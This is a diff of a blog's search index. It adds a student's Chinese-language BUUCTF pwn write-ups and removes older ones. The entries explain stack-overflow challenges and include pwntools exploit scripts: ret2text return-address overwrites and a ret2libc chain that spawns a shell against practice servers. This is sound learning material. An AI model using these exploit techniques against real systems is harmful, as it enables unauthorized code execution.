@@ -1,85 +1,373 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>week6-T1</title>
-    <url>/posts/c63e16b3/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Week-6-T1-bjdctf-2020-babystack"><a href="#Week-6-T1-bjdctf-2020-babystack" class="headerlink" title="Week 6 T1 bjdctf_2020_babystack"></a>Week 6 T1 bjdctf_2020_babystack</h2><blockquote>
-<p>2023-02-05WP<br>BUUCTF pwn 第十一题<br>考点：ret2text</p>
+    <title>week1 T2</title>
+    <url>/posts/ca38ece3/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-rip"><a href="#T2-rip" class="headerlink" title="T2 rip"></a>T2 rip</h2><blockquote>
+<p>2023-01-04WP<br>BUUCTF pwn第二题<br>考点：简单的栈溢出</p>
 </blockquote>
 <span id="more"></span>
 
-<p>省略第一步……只开了NX</p>
-<blockquote>
-<p>__isoc99_scanf(“%d”, &amp;nbytes)    让用户输入下次输入时接受的数据的长度</p>
-</blockquote>
-<blockquote>
-<p>read(0, &amp;buf, (unsigned int)nbytes)   用户可以控制长度，实现栈溢出</p>
-</blockquote>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>打开IDA</p>
-<p><img data-src="https://img-blog.csdnimg.cn/20200802192521891.png"></p>
-<p>找到有&#x2F;bin&#x2F;sh<br>找到后门函数</p>
-<p><img data-src="https://img-blog.csdnimg.cn/20200802192937904.png"></p>
-<p>buf占用的空间为0x10</p>
-<p><img data-src="https://img-blog.csdnimg.cn/20200802192913332.png"></p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,29891)</span><br><span class="line"></span><br><span class="line">backdoor_addr = 0x4006e6</span><br><span class="line"></span><br><span class="line">payload =b &#x27;a&#x27; * (0x10+8) + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;100&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>发现这样也不错，交给工具来找地址</p>
-<p><img data-src="https://img-blog.csdnimg.cn/4d3c024d108c4bbd85c7ef85fd505712.png"></p>
-<ul>
-<li>变量(unsigned int)nbytes用户可控，且是个无符号函数</li>
-<li><strong>可用-1进行绕过</strong>，这样用户可输入的数据长度就十分巨大了</li>
-<li>接着调用backdoor()即可getshell</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#start</span><br><span class="line"># r = process(&quot;../buu/bjdctf_2020_babystack&quot;)</span><br><span class="line">r = remote(&quot;node4.buuoj.cn&quot;,29891)</span><br><span class="line">elf = ELF(&quot;../buu/bjdctf_2020_babystack&quot;)</span><br><span class="line"></span><br><span class="line">#params</span><br><span class="line">backdoor_addr = elf.symbols[&#x27;backdoor&#x27;]</span><br><span class="line"></span><br><span class="line">#attack</span><br><span class="line">r.recvuntil(b&quot;your name:&quot;)</span><br><span class="line">r.sendline(&quot;-1&quot;)</span><br><span class="line">r.recvuntil(b&quot;name?&quot;)</span><br><span class="line">payload = b&#x27;M&#x27; * (0x10 + 8) + p64(backdoor_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+<h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><p>查看保护机制<br><img data-src="https://pic2.zhimg.com/80/v2-58b53c6902894211862d4148de61eaa1_1440w.webp"><br>啥都没开，非常nice</p>
+<h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><p>file后是64位，扔到IDA里<br><img data-src="https://pic4.zhimg.com/80/v2-7006f2599ec061a9ccd9e41370a2c34b_1440w.webp"><br>打开string window,发现有&#x2F;bin&#x2F;sh，双击-》点击command,ctrl+X跳到fun函数里<br><del>Function window直接找也行….</del><br><img data-src="https://pic2.zhimg.com/80/v2-42111c4151f4950164f04d213c23e9bd_1440w.webp"><br>直接f5大法<br>main函数里好像没啥用<br>看到char了一个s数组还有get函数，栈溢出无疑了<br><img data-src="https://pic3.zhimg.com/80/v2-21033c9a0be0c615a751be12c50d7a6a_1440w.webp"><br>fun函数里有system函数，想到把fun函数的地址压进栈的return address里使fun函数得以执行<br>于是找出fun函数中调用system的地址0x40118A<br><img data-src="https://pic2.zhimg.com/80/v2-23ce5525745d5b11353c4a0c792f0edd_1440w.webp"><br>有了地址，现在需要知道的是s的长度，在IDA中可以找到<br><img data-src="https://pic1.zhimg.com/80/v2-a94f13524837503afef423f2bcea458c_1440w.webp"><br>距离rbp的距离是0Fh，也就是s的内存空间为15字节,当然了，除此之外，还需要8字节的数据将rbp填满，才能让数据溢过Local Variables 和 Caller’s rsp，溢出进入Return Address</p>
+<h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>vim pwn1.py<br><code>#pwn1.py from pwn import * p = remote(&quot;node4 .buuoj.cn&quot;,25026) payload = b&#39;a&#39; * (0xf+8) + p64(0x40118A) p.sendline(payload) p.interactive() </code><br><del>一开始没加b’’然后报错TypeError: can only concatenate str (not “bytes”) to str……</del><br>执行脚本得到flag<br><img data-src="https://pic2.zhimg.com/80/v2-8cf32a5f0007c9057c530f3e4be55c6d_1440w.webp"></p>
+<h3 id="0x04-补充一些知识"><a href="#0x04-补充一些知识" class="headerlink" title="0x04 补充一些知识"></a>0x04 补充一些知识</h3><p>IDA栈帧视窗详细说明：<a href="https://blog.csdn.net/u012206617/article/details/87717310">这篇文章</a><br><a href="https://blog.csdn.net/ComputerInBook/article/details/126840323">这篇文章</a>举了一个例子详细说明</p>
+]]></content>
       <categories>
         <category>wp</category>
       </categories>
       <tags>
-        <tag>ctf BUUCTF</tag>
+        <tag>ctf</tag>
+        <tag>BUUCTF</tag>
       </tags>
   </entry>
   <entry>
-    <title>week4&amp;&amp;week5-T5</title>
-    <url>/posts/95338453/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-ciscn-2019-c-1"><a href="#T5-ciscn-2019-c-1" class="headerlink" title="T5 ciscn_2019_c_1"></a>T5 ciscn_2019_c_1</h2><blockquote>
-<p>2023-01-30WP<br>BUUCTF pwn 题<br>考点：栈溢出 ret2libc3</p>
+    <title>week1 T1</title>
+    <url>/posts/5331bd59/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-test-your-nc"><a href="#T1-test-your-nc" class="headerlink" title="T1 test_your_nc"></a>T1 test_your_nc</h2><blockquote>
+<p>2023-01-03WP<br>BUUCTF pwn第一题</p>
 </blockquote>
 <span id="more"></span>
 
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这不上一题刚做这类？直接模仿一手。。。。<br>file checksec —— 64-bit 开NX</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>运行一下看看</p>
-<p><img data-src="https://pic1.zhimg.com/80/v2-8b7794a415c00fa88ea4eab73b44e060_1440w.webp"></p>
-<p>再看看IDA</p>
-<p><img data-src="https://img-blog.csdnimg.cn/2020082517155968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
-<p>研究了半天发现是让你加解密的<br>再看看string window 没用system和binsh<br>又发现加密函数里有gets函数，可构成栈溢出</p>
-<p><img data-src="https://img-blog.csdnimg.cn/20200825172042284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>分析  是相同的思想，这里不赘述了，大致流程就是</p>
-<ol>
-<li>利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本</li>
-<li>用同一个程序里函数的地址-libc里的函数地址即可得到偏移量</li>
-<li>得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’&#x2F;bin&#x2F;sh‘）</li>
-</ol>
+<h3 id="一、用checksec检测文件保护机制"><a href="#一、用checksec检测文件保护机制" class="headerlink" title="一、用checksec检测文件保护机制"></a>一、用checksec检测文件保护机制</h3><p>下载文件，checksec得知已开启NX保护<br><img data-src="https://pic2.zhimg.com/80/v2-e67d3c6a1857cc38c34efd40ed29e80d_1440w.webp"><br>（奇怪的是checksec没有给出文件位数，后来还是file了一下得到是64位）</p>
+<h3 id="二、打开IDA"><a href="#二、打开IDA" class="headerlink" title="二、打开IDA"></a>二、打开IDA</h3><p>将文件扔到IDA中，按下shift+f12,打开string window，发现&#x2F;bin&#x2F;sh<br><img data-src="https://pic4.zhimg.com/v2-fbe627c7dd17761ef3bc56360d884f27_r.jpg"><br>双击&#x2F;bin&#x2F;sh，点击command，交叉引用快捷键X，发现地址在main函数里<br><img data-src="https://pic1.zhimg.com/80/v2-84f08756aa27af34ed8fa47762094234_1440w.webp"><br>按下f5确定main函数就是一个简单地调用了&#x2F;bin&#x2F;sh的system函数<br><img data-src="https://pic2.zhimg.com/80/v2-06f1ca937f2820c16be174944ebde851_1440w.webp"><br><del>(其实感觉前两步就这题来说没必要……但是看一篇博客说拿到文件先checksec一下再IDA一下于是想试一下……)</del></p>
+<h3 id="三、结合题目提示可知直接nc"><a href="#三、结合题目提示可知直接nc" class="headerlink" title="三、结合题目提示可知直接nc"></a>三、结合题目提示可知直接nc</h3><p><del>（这个地方一开始报错，仔细一看发现ctrl cv过来的端口那里还有一个：得把冒号去掉……）</del><br>ls列出文件目录<br><img data-src="https://pic4.zhimg.com/80/v2-d117911f69f0b5cdc99a9a7c5352489b_1440w.webp"><br>发现flag，用cat（concatenate，命令用于连接文件并打印到标准输出设备上）抓取flag得<br><img data-src="https://pic2.zhimg.com/80/v2-c7068e97c98c8f0dc5a292df9ab746cd_1440w.webp"></p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week1 T4</title>
+    <url>/posts/235b49d6/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ciscn-2019-n-1"><a href="#T4-ciscn-2019-n-1" class="headerlink" title="T4 ciscn_2019_n_1"></a>T4 ciscn_2019_n_1</h2><blockquote>
+<p>2023-01-08WP<br>BUUCTF pwn第四题</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>先<strong>file，chekcsec</strong>——64-bit，开启<strong>NX</strong><br><img data-src="https://pic2.zhimg.com/80/v2-fcbfe99feb2a92abc72a297e219777e9_1440w.webp"></p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>中main函数没啥有用的，看到还有一个fun函数<br><img data-src="https://pic2.zhimg.com/80/v2-ba42478d6dfc7d2b91ba248e835a4429_1440w.webp"><br>点进去看发现有个gets函数，可能存在栈溢出，同时发现if ( v2 &#x3D;&#x3D; 11.28125 )时调用system函数，所以想到输入来使v2的值等于11.28125<br>但是gets读入的时v1而不是v2，所以又想到让v1溢出，使溢出的值为11.28125并让它成为v2的值<br>于是进去查看v1v2的地址<br><img data-src="https://pic3.zhimg.com/80/v2-f9dc01951802e4c151cf6ddd0fdd1eee_1440w.webp"><br><img data-src="https://pic4.zhimg.com/80/v2-f90e4938ab553be25f298598c50e7d03_1440w.webp"><br>计算得长度为44h</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,25907)</span><br><span class="line">payload=b&quot;a&quot;*44+p64(0x41348000)#0x41348000是11.28125的十六进制数</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()          </span><br></pre></td></tr></table></figure>
+<p><del>直接写11.28125好像没用……</del><br><img data-src="https://pic1.zhimg.com/80/v2-c5edce340e57ef721fc68134243ee168_1440w.webp"><br>网上看到一篇<a href="https://blog.csdn.net/qq_41560595/article/details/108783758">博客</a>是直接从IDA中找十六进制数的<br>pwn得flag<br>还有一种方法就是直接覆盖v1v2，让返回地址指向调用system函数的地址0x4006BE<br><img data-src="https://pic4.zhimg.com/80/v2-cf387e39d529bbf5bdf92c02f6064f97_1440w.webp"><br>这就让我有<strong>一些疑惑：</strong>就这一题来说，开启了NX有没有让题目难度增加呢？</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week1 T3</title>
+    <url>/posts/bd3fdc75/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-warmup-csaw-2016"><a href="#T3-warmup-csaw-2016" class="headerlink" title="T3 warmup_csaw_2016"></a>T3 warmup_csaw_2016</h2><blockquote>
+<p>2023-01-06WP<br>BUUCTF pwn第三题<br>考点：栈溢出，与上题类似</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><p>下载文件，没有开启任何保护（看大佬博客里说按经验这种情况一般就是栈溢出了）<br><img data-src="https://pic1.zhimg.com/80/v2-fb4d58181e235c94561577b2c4af38dc_1440w.webp"></p>
+<h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><p>f5反汇编，main函数里有一个gets()函数<br><img data-src="https://pic3.zhimg.com/80/v2-19fc3d1ed197677ec860d87f4d328756_1440w.webp"><br>看到返回一个gets()函数，可利用栈溢出<br><del>但是这个两个参数的gets函数没有看懂……</del><br><del>那个write和sprintf函数也没看懂……</del><br>shift+f12调出string window 查看字符串，虽然没有&#x2F;bin&#x2F;sh，但是找到了一个cat flag.txt，应该可以利用<br><img data-src="https://pic1.zhimg.com/80/v2-a9342c39cccfcb08151c10e52d33d7f8_1440w.webp"><br>双击cat flag.txt进去看看，X一下发现是在sub_40060D函数里，反汇编再看一下发现我们想要的system（）就在这，若能调用它的话就能直接命令抓取flag了呀<br><img data-src="https://pic3.zhimg.com/80/v2-8439007eace8a199836ffba7ed7ae65e_1440w.webp"><br><img data-src="https://pic3.zhimg.com/80/v2-f6878b5ead1b0c9e36cf46e11b1b73c2_1440w.webp"><br>接下来就是记下sub_40060D函数的地址0x40060D,并将其作为溢出的返回地址（也可以记把偏移量压入寄存器那条汇编指令处的地址0x40011）<br><img data-src="https://pic1.zhimg.com/80/v2-ea795c3163730c1428cdeb16c15eabfc_1440w.webp"><br>又因为要gets的v5的大小为0x40h，所以与返回地址的距离是0x40+8（rbp的长度）<br><img data-src="https://pic3.zhimg.com/80/v2-78a46c31edfbcab05ff353e3e624996a_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-feaba2ae58e8a0cf0161837933d1fe29_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-244c60af51681873d600771f879d5c00_1440w.webp"></p>
+<h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>写出exploit</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,25916)</span><br><span class="line">payload=&#x27;a&#x27;*(0x40+8)+p64(0x400611)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到flag<br><img data-src="https://pic4.zhimg.com/80/v2-e3375ccc43536a0178b679606bfaa1eb_1440w.webp"></p>
+<h3 id="0x04-thinking"><a href="#0x04-thinking" class="headerlink" title="0x04 thinking"></a>0x04 thinking</h3><p>这题跟上一题一样，都是栈溢出，都是将某个后门函数的地址覆盖掉返回地址<br>一开始没反应过来cat flag.txt可以直接用，还在那找&#x2F;bin&#x2F;sh,<br>还是对信息不太敏感……<br>不过对栈的相关知识的学习还是让人感觉有收获的</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week2 T1</title>
+    <url>/posts/418412b7/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-ret2text"><a href="#T1-ret2text" class="headerlink" title="T1 ret2text"></a>T1 ret2text</h2><blockquote>
+<p>2023-01-09WP<br>ctf-wiki基础rop</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit， 开启NX<br><img data-src="https://pic3.zhimg.com/80/v2-20e95bd89f447f1d91529cc30f6128ce_1440w.webp"></p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看代码，可以看出main函数中有gets函数，存在栈溢出漏洞<br><img data-src="https://pic4.zhimg.com/80/v2-535180f34be67dbe755cf8473706034b_1440w.webp"><br>发现还有有一个secure函数调用了system(“&#x2F;bin&#x2F;sh”)<br><img data-src="https://pic2.zhimg.com/80/v2-fc8a7c446eb25d23f3b1743f1720ec71_1440w.webp"><br>双击字符串Ctrl+X，记下”&#x2F;bin&#x2F;sh”的地址0x0804863A<br>0x0804863A就是需要返回的地址</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>用gdb调试<br>在调用gets函数的地址处0x080486AE设置断点<br>r 运行如下<br><img data-src="https://pic4.zhimg.com/80/v2-e896b8f6a61789dae7d55da0447d61c3_1440w.webp"><br>其中ebp为0xffffcff8,esp为0xffffcf70,那么s为[esp+0x1c]即0xffffcf8c，相对于ebp的偏移是0x6c，相对于返回地址的偏移是0x6c+4</p>
 <h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"></span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,28342)</span><br><span class="line">elf=ELF(&#x27;./ciscn_2019_c_1&#x27;)</span><br><span class="line"></span><br><span class="line">main=0x400b28</span><br><span class="line">pop_rdi=0x400c83</span><br><span class="line">ret=0x4006b9</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><a href="https://github.com/lieanu/LibcSearcher">libcsearch</a>的github网址<br>安装</p>
-<blockquote>
-<p>git clone <a href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a><br>cd LibcSearcher<br>sudo python setup.py develop</p>
-</blockquote>
-<p>覆盖数据payload&#x3D;b’\0’+b’a’*(0x50-1+8)<br>\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，<br>buf的大小为0x50<br>-1是减去\0<br>+8是覆盖rbp</p>
-<p>这道题的接收非常讲究<br>泄露地址接收时先是两下recvline()，<br>原因</p>
-<blockquote>
-<p>recvline()一次接收到\n;<br>第一次recvline只能到Ciphertext；<br>第二次只能接收到0a<br>第三次的recvuntil才开始处理泄露的got地址。<br>先开一下context_log_lever&#x3D;’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。</p>
-</blockquote>
-<p>然后再用recvuntil(‘\n’)[:-1].ljust(8,’\0’)来舍弃接收到的字符串最后的’\x0’并向左补齐</p>
-<p>还有<br>这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了<br>32位程序运行执行指令的时候直接去内存地址寻址执行<br>64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序<br>因此要用寄存器存参<br>（为什么呢？？还是不理解啊）<br><img data-src="https://pic2.zhimg.com/80/v2-64d98b53873c335d7f889b202b92fb9d_1440w.webp"></p>
-<p>注意栈对齐<br><img data-src="https://pic1.zhimg.com/80/v2-5fb909989f2a46201c004e96d46f6890_1440w.webp"><br>虽然我不懂为什么要……</p>
-<p>还有<br>最后为什么还要再输一个0呢？</p>
-<p><img data-src="https://pic2.zhimg.com/80/v2-ffa2e57740c5b5b7047a9a03f3183039_1440w.webp"></p>
-<p>搞不懂了    <strong>求助</strong></p>
-<p>其实做这题主要还是模仿大佬们写的exp，好多细节都不清楚，但是感觉做了那么久又不能扔在那边等完全懂了再写题解    <del>感觉好浪费</del><br>还得再研究啊 </p>
-<p>参考资料：<br>  <a href="http://t.csdn.cn/m6si5">[BUUCTF]PWN6——ciscn_2019_c_1</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2text&#x27;)</span><br><span class="line">target = 0x804863a</span><br><span class="line">sh.sendline(b&#x27;A&#x27; * (0x6c+4) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p><strong>疑问：</strong>我有一点不明白的是为什么IDA中看到的s相对于ebp的偏移是64h，而gdb调试出来的是0x6c+4<br>网上看到有一个只用IDA就成功地算出了偏移量，但对于文章里的解释并不是很理解<br>只能说有时候IDA还是与gdb的有出入，不过还是以gdb调试的为准<br><img data-src="https://pic2.zhimg.com/80/v2-3afcfae075e4dbe213e06287af171919_1440w.webp"></p>
 ]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>ctf-wiki</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week1 T5</title>
+    <url>/posts/545c7940/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-pwn1-sctf-2016"><a href="#T5-pwn1-sctf-2016" class="headerlink" title="T5 pwn1_sctf_2016"></a>T5 pwn1_sctf_2016</h2><blockquote>
+<p>2023-01-09WP<br>BUUCTF pwn第五题</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit,开启NX<br><img data-src="https://pic3.zhimg.com/80/v2-746f7f97d1877dc7901815486c36d846_1440w.webp"></p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>中shift+f12可以找到有个cat flag.txt<br><img data-src="https://pic1.zhimg.com/80/v2-9d38aa862b9408f86802c4dca80493a4_1440w.webp"><br>可以利用这个函数来输出flag<br>查看调用它的函数并记下它的地址0x8048F0D<br><img data-src="https://pic3.zhimg.com/v2-107e624689b731fc197a5f737bac2106_r.jpg"><br>继续寻找能够溢出的函数，在main函数中的vuln函数里有fget()函数<br><img data-src="https://pic3.zhimg.com/80/v2-fc51095b6ef69a5c78254f87a3dcea9a_1440w.webp"><br>但是fget函数限制了输入长度为32，好像并不能构成栈溢出<br>于是我就蒙了，fget后面的伪代码又不是看得很懂……<br>查了许多大概理解了是后面的replace函数将一个字节的i换成了三个字节的you<br>这样一来我们只需要输入20个‘I’，replace后就会变成60个字节的‘you’,这样就能填满长度为0x3Ch的s<br>payload再覆盖掉ebp再加上get_flag函数的地址就可以了<br>最后看大佬博客半懂半不懂地写了个exp<br>（这篇<a href="https://www.freebuf.com/vuls/336623.html">博客</a>感觉算是比较详细的，它甚至是直接分析汇编语言）</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;, 28105)</span><br><span class="line">flag_addre = 0x08048F0D</span><br><span class="line">payload = b&#x27;I&#x27;*0x14+b&#x27;aaaa&#x27;+p32(flag_addre)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>还是不是很懂到底是怎么看出来是把i换成you的<br>还有就是这个replace函数的参数列表中那个v4代表的是什么<br><img data-src="https://pic3.zhimg.com/80/v2-cc78aea540c7bae381b3cfe547853dae_1440w.webp"><br>并没有在v4这里写入i或者you呀，这猜都不好猜是把i换成you了<br><del>直接点进去看replace的源码好像又不科学，根本看不懂……</del><br>补充：C++的伪代码就是比较难看，不能只看IDA了，要结合gdb调试去猜i换成you的替换</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week2 T2</title>
+    <url>/posts/d88d430d/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-ret2text-上题的另一种解法"><a href="#T2-ret2text-上题的另一种解法" class="headerlink" title="T2 ret2text(上题的另一种解法)"></a>T2 ret2text(上题的另一种解法)</h2><blockquote>
+<p>2023-01-09WP<br>网上看到另一种暴力解法感觉很不错于是自己做过了一遍<br><strong>0x01</strong>与<strong>0x02</strong>跟上题相同</p>
+</blockquote>
+<span id="more"></span>
+
